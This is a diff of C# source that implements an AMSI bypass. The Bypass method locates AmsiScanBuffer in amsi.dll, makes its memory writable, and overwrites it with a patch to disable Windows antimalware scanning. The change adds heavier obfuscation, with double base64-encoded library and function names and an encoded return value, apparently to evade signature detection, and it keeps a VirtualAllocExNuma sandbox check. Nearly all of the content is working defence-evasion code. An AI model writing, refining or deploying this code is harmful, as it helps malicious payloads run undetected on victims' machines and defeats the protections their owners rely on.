@@ -127,6 +127,7 @@ using System.Reflection.Emit;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Text;
 
 namespace v
 {
@@ -257,27 +258,18 @@ namespace v
         static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
         public static string Bypass()
         {
-            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
-            if (mem == null)
-            {
-                return null;
-            }
-            string dll1 = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("YW1zaS5kbGw="));
-
-            IntPtr lib = LoadLibrary(dll1);
-            string encP = "QW1zaVNjYW5CdWZmZXI=";
-            string decP = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(encP));
-            IntPtr addr = GetProcAddress(lib, decP);
-
-            var Patch = GetPatch;
-
-            uint oldProtect;
-            VirtualProtect(addr, (UIntPtr)Patch.Length, 0x40, out oldProtect);
-            Marshal.Copy(Patch, 0, addr, Patch.Length);
-            uint newProtect;
-            VirtualProtect(addr, (UIntPtr)Patch.Length, oldProtect, out newProtect);
-
-            return "OK";
+            Module1.VirtualAllocExNuma(Module1.GetCurrentProcess(), IntPtr.Zero, 4096U, 12288U, 4U, 0U);
+            IntPtr hModule = Module1.LoadLibrary(Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String("WVcxemFTNWtiR3c9")))));
+            string @string = Encoding.UTF8.GetString(Convert.FromBase64String("UVcxemFWTmpZVzVDZFdabVpYST0="));
+            string string2 = Encoding.ASCII.GetString(Convert.FromBase64String(@string));
+            IntPtr procAddress = Module1.GetProcAddress(hModule, string2);
+            byte[] getPatch = Module1.GetPatch;
+            uint flNewProtect;
+            Module1.VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), 64U, out flNewProtect);
+            Marshal.Copy(getPatch, 0, procAddress, getPatch.Length);
+            uint num;
+            Module1.VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), flNewProtect, out num);
+            return Encoding.UTF8.GetString(Convert.FromBase64String("T0s="));
 
         }
         static byte[] GetPatch
